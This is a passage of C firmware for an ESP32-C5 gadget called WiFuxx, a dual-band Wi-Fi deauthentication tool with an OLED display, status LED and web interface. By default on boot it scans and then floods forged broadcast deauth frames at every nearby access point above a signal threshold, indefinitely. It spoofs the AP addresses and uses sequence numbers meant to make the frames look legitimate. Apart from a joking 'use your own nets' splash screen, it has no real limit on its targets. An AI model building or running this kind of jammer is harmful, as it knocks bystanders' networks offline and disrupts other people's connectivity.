// main.c - WiFuxx C5 Dualband Deauthentication Tool - Infinite Attack Edition
// Dual-band deauth for ESP32-C5 with SSD1306 OLED
// Scans on boot, attacks all targets above threshold indefinitely.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_system.h"
#include "esp_attr.h"
#include "esp_http_server.h"
#include "mdns.h"
#include "cJSON.h"
#include "driver/i2c.h"
#include "driver/gpio.h"
#include "led_strip.h"
#include "settings.h"

static const char *TAG = "WiFuxx";

// ==================== CONFIGURATION ====================
// RSSI thresholds and burst sizes are now user-tunable at runtime and live in
// g_settings (NVS-backed, see settings.h). Their factory defaults are the
// WF_DEF_* macros there.
#define MAX_TARGETS                16
#define AUTO_SCAN_INTERVAL_SEC     25   // only used when no targets found on boot

#define CHANNEL_SWITCH_DELAY_MS    12
#define TARGET_BURST_DELAY_MS      1
#define BAND_SWITCH_DELAY_MS       5

// OLED I2C
#define I2C_MASTER_NUM     I2C_NUM_0
#define I2C_MASTER_SDA_IO  GPIO_NUM_23
#define I2C_MASTER_SCL_IO  GPIO_NUM_24
#define I2C_MASTER_FREQ_HZ 400000
#define OLED_ADDR          0x3C

// Status LED (WS2812B)
#define STATUS_LED_GPIO        GPIO_NUM_27
#define STATUS_LED_BRIGHTNESS  64    // 25% of 255 (0.25 * 255 ~= 64)
#define STATUS_LED_TICK_MS     40    // animation update period

// SoftAP / WebUI mode — SSID and channel are user-tunable (g_settings.ap_ssid /
// g_settings.ap_channel); factory defaults are WF_DEF_AP_SSID / WF_DEF_AP_CHANNEL.
#define WEBUI_AP_MAX_CONN  1
#define WEBUI_AP_IP        "192.168.42.42"   // device IP, gateway and DNS in WebUI mode
#define WEBUI_MDNS_HOST    "wifuxx"           // -> http://wifuxx.local (alongside the IP)
#define WEBUI_SCAN_MAX     32                // APs surfaced in the WebUI scan list (attack stays MAX_TARGETS)

// BOOT button — 2s hold (at runtime) enters WebUI.
// NOTE: on the XIAO ESP32-C5 the BOOT button is GPIO28 (Arduino BOOT_PIN), NOT GPIO9.
// GPIO28 is the boot strapping pin: holding it during power-on/reset enters serial
// download mode (the app never runs), so we can only poll it AFTER boot.
#define BOOT_BUTTON_GPIO   GPIO_NUM_28
#define BUTTON_HOLD_MS     2000
#define BUTTON_RESET_HOLD_MS 10000   // WebUI mode: hold this long to factory-reset (lockout escape)
#define BUTTON_POLL_MS     20

// Battery sense — the XIAO ESP32-C5 has a built-in /2 divider on GPIO6 (ADC1 ch5),
// gated by GPIO26 (drive high to enable). No external parts needed. (The bare
// DevKit has no battery circuit; charge mode there just reads ~nothing.)
#define BATTERY_ADC_GPIO       GPIO_NUM_6     // BAT_VOLT_PIN
#define BATTERY_EN_GPIO        GPIO_NUM_26    // BAT_VOLT_PIN_EN — high enables the divider
#define BATTERY_DIVIDER_RATIO  2              // equal resistors -> battery = node * 2
#define BATTERY_FULL_MV        4200           // 100%
#define BATTERY_EMPTY_MV       3300           // 0%
#define BATTERY_SAMPLES        16             // raw reads averaged per update
#define BATTERY_EMA_DEN        8              // smoothing: new = old + (sample-old)/N
#define BATTERY_PRESENT_MIN_MV 2500           // below this we assume no battery/divider
#define CHARGE_UPDATE_SEC      30             // charge-mode wake interval to refresh the readout
#define CHARGE_OLED_CONTRAST   0x80           // ~50% — dim the panel in charge mode to save power
// =======================================================

// ==================== Boot Mode (persisted across esp_restart in RTC memory) ====================
// RTC_NOINIT survives a software reset but holds garbage after a true power-on,
// so a magic value distinguishes the two: an unrecognised magic = cold boot =>
// default to autonomous ATTACK. Mode switches are done by writing these then
// rebooting, so every boot is a clean, single-purpose Wi-Fi init.
#define BOOT_MODE_MAGIC    0x57463232u   // 'WF22'
#define BOOT_MODE_ATTACK   0u
#define BOOT_MODE_WEBUI    1u
#define BOOT_MODE_CHARGE   2u            // low-power: Wi-Fi off, just charge the battery
#define SEL_MODE_ALL       0u            // attack all targets above threshold (autonomous default)
#define SEL_MODE_SINGLE    1u            // attack only g_sel_mac (ignores threshold)
#define SEL_MODE_DUALBAND  2u            // attack every BSSID of g_sel_ssid, both bands (ignores threshold)

RTC_NOINIT_ATTR static uint32_t g_boot_magic;
RTC_NOINIT_ATTR static uint32_t g_boot_mode;
RTC_NOINIT_ATTR static uint32_t g_sel_mode;
RTC_NOINIT_ATTR static uint8_t  g_sel_mac[6];
RTC_NOINIT_ATTR static char     g_sel_ssid[33];

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t packets_sent;
    bool active;
    int rssi;
} attack_target_t;

typedef struct {
    attack_target_t targets[MAX_TARGETS];
    uint16_t count;
} target_list_t;

// Global state — volatile where read/written across tasks
static volatile bool attack_running  = false;
static target_list_t auto_targets    = {0};
static uint32_t attack_start_time    = 0;
static TaskHandle_t attack_task_handle = NULL;

// Display data
static SemaphoreHandle_t display_mutex = NULL;
typedef struct {
    uint8_t ap_count_24;
    uint8_t ap_count_5;
    char status[16];
    char ssid_list[8][32];
    uint8_t ssid_count;
} display_info_t;
static display_info_t current_display_info = {0};

// When true, display_task renders the WebUI "connect to" screen instead of the
// scan/attack screen. Set once at boot in WebUI mode (mode is fixed per boot).
static volatile bool g_webui_display = false;

// Set by the 10s-BOOT-hold factory reset so display_task shows a confirmation
// screen before the device reboots (otherwise the reset is silent).
static volatile bool g_webui_resetting = false;

// Deauth reason codes
static const uint16_t deauth_reasons[] = {
    0x0001, 0x0003, 0x0006, 0x0007, 0x0008, 0x000C, 0x000D
};
static const uint8_t num_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);

// ==================== Status LED ====================
// Color signals on a single WS2812B at STATUS_LED_GPIO, scaled to 25% brightness.
//   BOOT         : solid blue        — chip powering up
//   WIFI_INIT    : solid magenta     — bringing up Wi-Fi / OLED
//   SCANNING     : cyan fast pulse   — scanning for networks
//   NO_TARGETS   : yellow slow blink — scan complete, nothing strong enough, retrying
//   TARGETS_FOUND: solid green       — targets locked, attack about to start
//   ATTACKING    : red breathing     — deauth burst loop running
//   WEBUI_IDLE   : solid orange      — SoftAP up, WebUI awaiting commands
typedef enum {
    LED_STATE_BOOT = 0,
    LED_STATE_WIFI_INIT,
    LED_STATE_SCANNING,
    LED_STATE_NO_TARGETS,
    LED_STATE_TARGETS_FOUND,
    LED_STATE_ATTACKING,
    LED_STATE_WEBUI_IDLE,
} led_state_t;

static volatile led_state_t led_state = LED_STATE_BOOT;
static led_strip_handle_t   status_led = NULL;

#include "boot_bitmap.h"
#include "gallus_bitmap.h"
#include "gallus_flash_bitmap.h"
#include "saltire_bitmap.h"
#include "monitor_bitmap.h"
#include "favicon.h"

// ==================== Status LED Driver ====================
static void status_led_init(void) {
    led_strip_config_t strip_cfg = {
        .strip_gpio_num        = STATUS_LED_GPIO,
        .max_leds              = 1,
        .led_model             = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags                 = { .invert_out = false },
    };
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src           = RMT_CLK_SRC_DEFAULT,
        .resolution_hz     = 10 * 1000 * 1000,  // 10MHz
        .mem_block_symbols = 0,
        .flags             = { .with_dma = 0 },
    };
    if (led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &status_led) != ESP_OK) {
        ESP_LOGW(TAG, "Status LED init failed");
        status_led = NULL;
        return;
    }
    led_strip_clear(status_led);
    led_strip_refresh(status_led);
}

// Scale a 0..255 channel down to STATUS_LED_BRIGHTNESS (25%).
static inline uint8_t led_scale(uint8_t v) {
    return (uint16_t)v * STATUS_LED_BRIGHTNESS / 255;
}

// 0..255 triangle wave for breathing/pulsing — `period_ms` is full cycle length.
static uint8_t triangle_wave(uint32_t t_ms, uint32_t period_ms) {
    uint32_t phase = t_ms % period_ms;
    uint32_t half  = period_ms / 2;
    return (phase < half)
         ? (uint8_t)(phase * 255 / half)
         : (uint8_t)((period_ms - phase) * 255 / half);
}

// Full-saturation HSV -> RGB. `hue` 0..255 wraps the colour wheel, `val` 0..255
// is brightness. Used for the WebUI-idle rainbow breath.
static void hsv_to_rgb(uint8_t hue, uint8_t val, uint8_t *r, uint8_t *g, uint8_t *b) {
    uint8_t region = hue / 43;                 // 0..5 sextant
    uint8_t rem    = (hue - region * 43) * 6;  // position within sextant, 0..255
    uint8_t q  = (uint16_t)val * (255 - rem) / 255;
    uint8_t tt = (uint16_t)val * rem / 255;
    switch (region) {
        case 0:  *r = val; *g = tt;  *b = 0;   break;
        case 1:  *r = q;   *g = val; *b = 0;   break;
        case 2:  *r = 0;   *g = val; *b = tt;  break;
        case 3:  *r = 0;   *g = q;   *b = val; break;
        case 4:  *r = tt;  *g = 0;   *b = val; break;
        default: *r = val; *g = 0;   *b = q;   break;
    }
}

static void status_led_task(void *pvParameters) {
    uint32_t t = 0;
    while (1) {
        uint8_t r = 0, g = 0, b = 0;

        switch (led_state) {
            case LED_STATE_BOOT:
                // Solid blue
                b = 255;
                break;
            case LED_STATE_WIFI_INIT:
                // Solid magenta
                r = 255; b = 200;
                break;
            case LED_STATE_SCANNING: {
                // Cyan fast pulse (~600ms period)
                uint8_t lvl = triangle_wave(t, 600);
                g = lvl; b = lvl;
                break;
            }
            case LED_STATE_NO_TARGETS: {
                // Yellow slow blink (~1.6s on/off)
                bool on = ((t / 800) & 1) == 0;
                if (on) { r = 255; g = 180; }
                break;
            }
            case LED_STATE_TARGETS_FOUND:
                // Solid green
                g = 255;
                break;
            case LED_STATE_ATTACKING: {
                // Red breathing (~900ms cycle) with a floor so it never fully drops to black
                uint8_t lvl = triangle_wave(t, 900);
                if (lvl < 60) lvl = 60;
                r = lvl;
                break;
            }
            case LED_STATE_WEBUI_IDLE: {
                // Rainbow breath: a slow ~4s breath whose hue drifts so each breath
                // starts on a new colour, looping the spectrum about every 24s. A
                // brightness floor keeps it gently glowing instead of going black.
                uint8_t breath = triangle_wave(t, 4000);
                if (breath < 40) breath = 40;
                uint8_t hue = (t / 94) & 0xFF;   // 256 * 94ms ≈ 24s full rainbow
                hsv_to_rgb(hue, breath, &r, &g, &b);
                break;
            }
        }

        if (status_led) {
            led_strip_set_pixel(status_led, 0, led_scale(r), led_scale(g), led_scale(b));
            led_strip_refresh(status_led);
        }

        vTaskDelay(pdMS_TO_TICKS(STATUS_LED_TICK_MS));
        t += STATUS_LED_TICK_MS;
    }
}

// ==================== SSD1306 Framebuffer Driver ====================
// All drawing is done in-memory; oled_flush() sends only dirty pages.
// Each page flush uses 2 I2C transactions instead of 131, reducing a
// full screen refresh from ~2000 transactions to at most 16.

static uint8_t  fb[8][128];
static bool     page_dirty[8];

static void i2c_master_init(void) {
    i2c_config_t conf = {
        .mode             = I2C_MODE_MASTER,
        .sda_io_num       = I2C_MASTER_SDA_IO,
        .scl_io_num       = I2C_MASTER_SCL_IO,
        .sda_pullup_en    = GPIO_PULLUP_ENABLE,
        .scl_pullup_en    = GPIO_PULLUP_ENABLE,
        .master.clk_speed = I2C_MASTER_FREQ_HZ,
    };
    ESP_ERROR_CHECK(i2c_param_config(I2C_MASTER_NUM, &conf));
    ESP_ERROR_CHECK(i2c_driver_install(I2C_MASTER_NUM, conf.mode, 0, 0, 0));
}

// Send multiple commands in one I2C transaction (control byte 0x00 = command stream)
static void oled_send_cmds(const uint8_t *cmds, size_t len) {
    uint8_t buf[64];
    if (len + 1 > sizeof(buf)) return;
    buf[0] = 0x00;
    memcpy(buf + 1, cmds, len);
    i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buf, len + 1, pdMS_TO_TICKS(100));
}

// Flush one page to hardware: 1 command transaction + 1 data transaction
static void oled_flush_page(uint8_t page) {
    uint8_t cmds[] = {0xB0 + page, 0x00, 0x10};
    oled_send_cmds(cmds, sizeof(cmds));

    uint8_t buf[129];
    buf[0] = 0x40;  // data stream control byte
    memcpy(buf + 1, fb[page], 128);
    i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buf, 129, pdMS_TO_TICKS(100));
    page_dirty[page] = false;
}

static void oled_flush(void) {
    for (uint8_t p = 0; p < 8; p++) {
        if (page_dirty[p]) oled_flush_page(p);
    }
}

static void oled_clear_page(uint8_t page) {
    memset(fb[page], 0, 128);
    page_dirty[page] = true;
}

static void oled_clear_screen(void) {
    memset(fb, 0, sizeof(fb));
    memset(page_dirty, true, sizeof(page_dirty));
    oled_flush();
}

static void oled_init(void) {
    i2c_master_init();
    vTaskDelay(pdMS_TO_TICKS(100));
    static const uint8_t init_cmds[] = {
        0xAE, 0x20, 0x00, 0xB0, 0xC8, 0x00, 0x10, 0x40,
        0x81, 0xFF, 0xA1, 0xA6, 0xA8, 0x3F, 0xA4, 0xD3,
        0x00, 0xD5, 0xF0, 0xD9, 0x22, 0xDA, 0x12, 0xDB,
        0x20, 0x8D, 0x14, 0xAF
    };
    oled_send_cmds(init_cmds, sizeof(init_cmds));
    memset(fb, 0, sizeof(fb));
    memset(page_dirty, true, sizeof(page_dirty));
    oled_flush();
}

// SSD1306 contrast (0x81). Used to fade the splash in/out without redrawing.
static void oled_set_contrast(uint8_t level) {
    uint8_t cmds[] = { 0x81, level };
    oled_send_cmds(cmds, sizeof(cmds));
}

static void oled_draw_char(uint8_t x, uint8_t page, char c) {
    if (c < 32 || c > 126) c = 32;
    if (x + 8 > 128) return;
    static const uint8_t font8x8[96][8] = {
        {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x00,0x5F,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x07,0x00,0x07,0x00,0x00,0x00,0x00},
        {0x14,0x7F,0x14,0x7F,0x14,0x00,0x00,0x00},
        {0x24,0x2A,0x7F,0x2A,0x12,0x00,0x00,0x00},
        {0x23,0x13,0x08,0x64,0x62,0x00,0x00,0x00},
        {0x36,0x49,0x55,0x22,0x50,0x00,0x00,0x00},
        {0x00,0x05,0x03,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x1C,0x22,0x41,0x00,0x00,0x00,0x00},
        {0x00,0x41,0x22,0x1C,0x00,0x00,0x00,0x00},
        {0x14,0x08,0x3E,0x08,0x14,0x00,0x00,0x00},
        {0x08,0x08,0x3E,0x08,0x08,0x00,0x00,0x00},
        {0x00,0x50,0x30,0x00,0x00,0x00,0x00,0x00},
        {0x08,0x08,0x08,0x08,0x08,0x00,0x00,0x00},
        {0x00,0x60,0x60,0x00,0x00,0x00,0x00,0x00},
        {0x20,0x10,0x08,0x04,0x02,0x00,0x00,0x00},
        {0x3E,0x51,0x49,0x45,0x3E,0x00,0x00,0x00},
        {0x00,0x42,0x7F,0x40,0x00,0x00,0x00,0x00},
        {0x42,0x61,0x51,0x49,0x46,0x00,0x00,0x00},
        {0x21,0x41,0x45,0x4B,0x31,0x00,0x00,0x00},
        {0x18,0x14,0x12,0x7F,0x10,0x00,0x00,0x00},
        {0x27,0x45,0x45,0x45,0x39,0x00,0x00,0x00},
        {0x3C,0x4A,0x49,0x49,0x30,0x00,0x00,0x00},
        {0x01,0x71,0x09,0x05,0x03,0x00,0x00,0x00},
        {0x36,0x49,0x49,0x49,0x36,0x00,0x00,0x00},
        {0x06,0x49,0x49,0x29,0x1E,0x00,0x00,0x00},
        {0x00,0x36,0x36,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x56,0x36,0x00,0x00,0x00,0x00,0x00},
        {0x08,0x14,0x22,0x41,0x00,0x00,0x00,0x00},
        {0x14,0x14,0x14,0x14,0x14,0x00,0x00,0x00},
        {0x00,0x41,0x22,0x14,0x08,0x00,0x00,0x00},
        {0x02,0x01,0x51,0x09,0x06,0x00,0x00,0x00},
        {0x32,0x49,0x79,0x41,0x3E,0x00,0x00,0x00},
        {0x7E,0x11,0x11,0x11,0x7E,0x00,0x00,0x00},
        {0x7F,0x49,0x49,0x49,0x36,0x00,0x00,0x00},
        {0x3E,0x41,0x41,0x41,0x22,0x00,0x00,0x00},
        {0x7F,0x41,0x41,0x22,0x1C,0x00,0x00,0x00},
        {0x7F,0x49,0x49,0x49,0x41,0x00,0x00,0x00},
        {0x7F,0x09,0x09,0x09,0x01,0x00,0x00,0x00},
        {0x3E,0x41,0x49,0x49,0x7A,0x00,0x00,0x00},
        {0x7F,0x08,0x08,0x08,0x7F,0x00,0x00,0x00},
        {0x00,0x41,0x7F,0x41,0x00,0x00,0x00,0x00},
        {0x20,0x40,0x41,0x3F,0x01,0x00,0x00,0x00},
        {0x7F,0x08,0x14,0x22,0x41,0x00,0x00,0x00},
        {0x7F,0x40,0x40,0x40,0x40,0x00,0x00,0x00},
        {0x7F,0x02,0x0C,0x02,0x7F,0x00,0x00,0x00},
        {0x7F,0x04,0x08,0x10,0x7F,0x00,0x00,0x00},
        {0x3E,0x41,0x41,0x41,0x3E,0x00,0x00,0x00},
        {0x7F,0x09,0x09,0x09,0x06,0x00,0x00,0x00},
        {0x3E,0x41,0x51,0x21,0x5E,0x00,0x00,0x00},
        {0x7F,0x09,0x19,0x29,0x46,0x00,0x00,0x00},
        {0x46,0x49,0x49,0x49,0x31,0x00,0x00,0x00},
        {0x01,0x01,0x7F,0x01,0x01,0x00,0x00,0x00},
        {0x3F,0x40,0x40,0x40,0x3F,0x00,0x00,0x00},
        {0x1F,0x20,0x40,0x20,0x1F,0x00,0x00,0x00},
        {0x3F,0x40,0x38,0x40,0x3F,0x00,0x00,0x00},
        {0x63,0x14,0x08,0x14,0x63,0x00,0x00,0x00},
        {0x07,0x08,0x70,0x08,0x07,0x00,0x00,0x00},
        {0x61,0x51,0x49,0x45,0x43,0x00,0x00,0x00},
        {0x00,0x7F,0x41,0x41,0x00,0x00,0x00,0x00},
        {0x02,0x04,0x08,0x10,0x20,0x00,0x00,0x00},
        {0x00,0x41,0x41,0x7F,0x00,0x00,0x00,0x00},
        {0x04,0x02,0x01,0x02,0x04,0x00,0x00,0x00},
        {0x40,0x40,0x40,0x40,0x40,0x00,0x00,0x00},
        {0x00,0x01,0x02,0x04,0x00,0x00,0x00,0x00},
        {0x20,0x54,0x54,0x54,0x78,0x00,0x00,0x00},
        {0x7F,0x48,0x44,0x44,0x38,0x00,0x00,0x00},
        {0x38,0x44,0x44,0x44,0x20,0x00,0x00,0x00},
        {0x38,0x44,0x44,0x48,0x7F,0x00,0x00,0x00},
        {0x38,0x54,0x54,0x54,0x18,0x00,0x00,0x00},
        {0x08,0x7E,0x09,0x01,0x02,0x00,0x00,0x00},
        {0x0C,0x52,0x52,0x52,0x3E,0x00,0x00,0x00},
        {0x7F,0x08,0x04,0x04,0x78,0x00,0x00,0x00},
        {0x00,0x44,0x7D,0x40,0x00,0x00,0x00,0x00},
        {0x20,0x40,0x44,0x3D,0x00,0x00,0x00,0x00},
        {0x7F,0x10,0x28,0x44,0x00,0x00,0x00,0x00},
        {0x00,0x41,0x7F,0x40,0x00,0x00,0x00,0x00},
        {0x7C,0x04,0x18,0x04,0x78,0x00,0x00,0x00},
        {0x7C,0x08,0x04,0x04,0x78,0x00,0x00,0x00},
        {0x38,0x44,0x44,0x44,0x38,0x00,0x00,0x00},
        {0x7C,0x14,0x14,0x14,0x08,0x00,0x00,0x00},
        {0x08,0x14,0x14,0x18,0x7C,0x00,0x00,0x00},
        {0x7C,0x08,0x04,0x04,0x08,0x00,0x00,0x00},
        {0x48,0x54,0x54,0x54,0x20,0x00,0x00,0x00},
        {0x04,0x3F,0x44,0x40,0x20,0x00,0x00,0x00},
        {0x3C,0x40,0x40,0x20,0x7C,0x00,0x00,0x00},
        {0x1C,0x20,0x40,0x20,0x1C,0x00,0x00,0x00},
        {0x3C,0x40,0x30,0x40,0x3C,0x00,0x00,0x00},
        {0x44,0x28,0x10,0x28,0x44,0x00,0x00,0x00},
        {0x0C,0x50,0x50,0x50,0x3C,0x00,0x00,0x00},
        {0x44,0x64,0x54,0x4C,0x44,0x00,0x00,0x00},
        {0x00,0x08,0x36,0x41,0x00,0x00,0x00,0x00},
        {0x00,0x00,0x7F,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x41,0x36,0x08,0x00,0x00,0x00,0x00},
        {0x10,0x08,0x10,0x08,0x00,0x00,0x00,0x00},
    };
    memcpy(fb[page] + x, font8x8[c - 32], 8);
    page_dirty[page] = true;
}

static void oled_draw_string(uint8_t x, uint8_t page, const char *str) {
    while (*str && x + 8 <= 128) {
        oled_draw_char(x, page, *str++);
        x += 8;
    }
}

// Converts row-major MSB-first bitmap into SSD1306 page format and renders it
// Render a 128x64 row-major MSB-first bitmap (16 bytes/row) to the framebuffer.
static void oled_draw_bitmap_fullscreen(const uint8_t *bmp) {
    for (int p = 0; p < 8; p++) {
        for (int x = 0; x < 128; x++) {
            uint8_t val = 0;
            for (int bit = 0; bit < 8; bit++) {
                int row = p * 8 + bit;
                if (bmp[row * 16 + x / 8] & (0x80 >> (x % 8)))
                    val |= (1 << bit);
            }
            fb[p][x] = val;
        }
        page_dirty[p] = true;
    }
    oled_flush();
}

// Boot sequence: "studio intro -> title card" — the Gallus Gadgets brand
// animates in (saltire logo fades up, then the wordmark flashes), then the
// WiFuxx product logo + the WebUI hint / disclaimer, before handing off to
// scanning. The BOOT-hold works the whole time the device is attacking, so this
// screen is purely a heads-up — we have all the time we need here.
static void oled_display_text_intro(void) {
    // -- Gallus Gadgets: saltire logo fades in via the contrast register --
    // Quadratic ease-in (level ~ i^2) so it emerges slowly from near-black and
    // brightens smoothly — many small steps keep the ramp gradient-smooth.
    oled_set_contrast(0x00);
    oled_draw_bitmap_fullscreen(saltire_bitmap);
    const int fade_steps = 64;
    for (int i = 0; i <= fade_steps; i++) {
        int level = (i * i * 255) / (fade_steps * fade_steps);
        oled_set_contrast((uint8_t)level);
        vTaskDelay(pdMS_TO_TICKS(11));
    }
    oled_set_contrast(0xFF);
    vTaskDelay(pdMS_TO_TICKS(1100));

    // -- Gallus Gadgets wordmark: settle, then flash/pop (normal <-> inverted) --
    oled_draw_bitmap_fullscreen(gallus_bitmap);
    vTaskDelay(pdMS_TO_TICKS(400));
    for (int i = 0; i < 3; i++) {
        oled_draw_bitmap_fullscreen(gallus_flash_bitmap);
        vTaskDelay(pdMS_TO_TICKS(55));
        oled_draw_bitmap_fullscreen(gallus_bitmap);
        vTaskDelay(pdMS_TO_TICKS(70));
    }
    vTaskDelay(pdMS_TO_TICKS(850));

    // -- WiFuxx product logo --
    oled_draw_bitmap_fullscreen(boot_bitmap);
    vTaskDelay(pdMS_TO_TICKS(2400));

    oled_clear_screen();
    oled_draw_string(0, 0, ">> WiFuxx");
    oled_draw_string(0, 1, "Dual-Band Deauth");

    oled_draw_string(0, 3, "Hold BOOT btn");
    oled_draw_string(0, 4, "2s for WebUI");

    oled_draw_string(0, 6, "Use your own");
    oled_draw_string(0, 7, "nets only :P");
    oled_flush();
    vTaskDelay(pdMS_TO_TICKS(3200));
    oled_clear_screen();
}

// ==================== Deauth Frame ====================
typedef struct {
    uint8_t  frame_ctrl[2];
    uint8_t  duration[2];
    uint8_t  da[6];
    uint8_t  sa[6];
    uint8_t  bssid[6];
    uint8_t  seq[2];
    uint8_t  reason[2];
} __attribute__((packed)) deauth_frame_t;

// ==================== Utility ====================
static uint32_t get_time_sec(void) {
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

// ==================== Boot Mode Helpers ====================
// Validate RTC state on entry. On a power-on/brown-out (magic absent or an
// explicit power reset) force the autonomous ATTACK default; otherwise trust
// the values a previous mode-switch reboot left behind.
static void boot_mode_init(void) {
    esp_reset_reason_t reason = esp_reset_reason();
    bool cold = (g_boot_magic != BOOT_MODE_MAGIC) ||
                (reason == ESP_RST_POWERON) ||
                (reason == ESP_RST_BROWNOUT);
    if (cold) {
        g_boot_magic = BOOT_MODE_MAGIC;
        g_boot_mode  = BOOT_MODE_ATTACK;
        g_sel_mode   = SEL_MODE_ALL;
        memset(g_sel_mac, 0, sizeof(g_sel_mac));
        g_sel_ssid[0] = '\0';
    }
    const char *mode_name = g_boot_mode == BOOT_MODE_WEBUI  ? "WEBUI"
                          : g_boot_mode == BOOT_MODE_CHARGE ? "CHARGE" : "ATTACK";
    ESP_LOGI(TAG, "Boot mode: %s (reset reason %d)", mode_name, (int)reason);
}

// Persist the next-boot mode and reset into it. Wi-Fi/HTTP/promiscuous teardown
// is implicit in the reset, which is exactly why this is more robust than an
// in-place mode switch on the ESP32-C5.
static void reboot_into(uint32_t mode) {
    g_boot_magic = BOOT_MODE_MAGIC;
    g_boot_mode  = mode;
    ESP_LOGW(TAG, "Rebooting into %s mode",
             mode == BOOT_MODE_WEBUI ? "WEBUI" : mode == BOOT_MODE_CHARGE ? "CHARGE" : "ATTACK");
    vTaskDelay(pdMS_TO_TICKS(150));  // let any in-flight HTTP response / log flush
    esp_restart();
}

// ==================== Deauth ====================
static void send_deauth_frame(const uint8_t *ap_mac, uint16_t reason) {
    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    static uint16_t seq_num = 0;

    deauth_frame_t frame = {
        .frame_ctrl = {0xC0, 0x00},
        .duration   = {0x00, 0x00},
    };
    memcpy(frame.da,    broadcast, 6);
    memcpy(frame.sa,    ap_mac,   6);
    memcpy(frame.bssid, ap_mac,   6);

    // Rolling sequence number makes frames look more legitimate
    frame.seq[0] = (seq_num << 4) & 0xF0;
    frame.seq[1] = (seq_num >> 4) & 0xFF;
    seq_num++;

    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
}

// Attack all targets in one band's target list, iterating by channel
static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz) {
    if (list->count == 0) return;

    // Collect unique channels — at most MAX_TARGETS unique channels possible
    uint8_t channels[MAX_TARGETS];
    uint8_t num_channels = 0;

    for (int i = 0; i < list->count; i++) {
        uint8_t ch = list->targets[i].channel;
        bool found = false;
        for (int j = 0; j < num_channels; j++) {
            if (channels[j] == ch) { found = true; break; }
        }
        if (!found) channels[num_channels++] = ch;
    }

    for (int c = 0; c < num_channels; c++) {
        esp_wifi_set_channel(channels[c], WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));

        for (int t = 0; t < list->count; t++) {
            attack_target_t *target = &list->targets[t];
            if (!target->active || target->channel != channels[c]) continue;

            for (int i = 0; i < burst_size; i++) {
                send_deauth_frame(target->bssid, deauth_reasons[i % num_reasons]);
                target->packets_sent++;

                if (i % 8 == 7 && is_5ghz) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
            vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
        }
    }
}

// ==================== Attack Task ====================
static void multi_band_attack_task(void *pvParameters) {
    ESP_LOGI(TAG, "╔════════════════════════════════════════╗");
    ESP_LOGI(TAG, "║          PRO DEAUTH PEN TEST           ║");
    ESP_LOGI(TAG, "║        DUAL-BAND ATTACK ACTIVE         ║");
    ESP_LOGI(TAG, "╚════════════════════════════════════════╝");

    target_list_t targets_24 = {0};
    target_list_t targets_5  = {0};

    for (int i = 0; i < auto_targets.count; i++) {
        if (auto_targets.targets[i].channel <= 14)
            targets_24.targets[targets_24.count++] = auto_targets.targets[i];
        else
            targets_5.targets[targets_5.count++]   = auto_targets.targets[i];
    }

    ESP_LOGI(TAG, "2.4GHz Targets: %d", targets_24.count);
    for (int i = 0; i < targets_24.count; i++) {
        ESP_LOGI(TAG, "  [%d] %s (CH %d, RSSI %d)",
                 i, targets_24.targets[i].ssid,
                 targets_24.targets[i].channel, targets_24.targets[i].rssi);
    }

    ESP_LOGI(TAG, "5GHz Targets: %d", targets_5.count);
    for (int i = 0; i < targets_5.count; i++) {
        ESP_LOGI(TAG, "  [%d] %s (CH %d, RSSI %d)",
                 i, targets_5.targets[i].ssid,
                 targets_5.targets[i].channel, targets_5.targets[i].rssi);
    }

    ESP_LOGI(TAG, "Attack duration: INFINITE");

    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "ATTACK");
        xSemaphoreGive(display_mutex);
    }

    attack_start_time = get_time_sec();
    uint32_t last_log_time = 0;
    uint32_t cycle_count   = 0;

    for (int i = 0; i < auto_targets.count; i++)
        auto_targets.targets[i].packets_sent = 0;

    ESP_LOGI(TAG, "DUAL-BAND ATTACK STARTED!");

    while (attack_running) {
        uint32_t elapsed = get_time_sec() - attack_start_time;

        if (targets_24.count > 0) {
            attack_band(&targets_24, g_settings.burst_24, false);
            vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
        }

        if (targets_5.count > 0) {
            attack_band(&targets_5, g_settings.burst_5, true);
            vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
        }

        cycle_count++;

        if (elapsed - last_log_time >= 2) {
            last_log_time = elapsed;

            uint32_t pkt_24 = 0, pkt_5 = 0;
            for (int i = 0; i < targets_24.count; i++) pkt_24 += targets_24.targets[i].packets_sent;
            for (int i = 0; i < targets_5.count;  i++) pkt_5  += targets_5.targets[i].packets_sent;

            uint32_t total        = pkt_24 + pkt_5;
            uint32_t elapsed_safe = elapsed > 0 ? elapsed : 1;
            float    pps          = (float)total / elapsed_safe;

            ESP_LOGI(TAG, "[%lu s] Total: %6lu pkt | PPS: %4.0f | Cycles: %lu",
                     elapsed, total, pps, cycle_count);

            if (targets_24.count > 0)
                ESP_LOGI(TAG, "  2.4GHz: %6lu pkt (%4.0f pps) - %d targets",
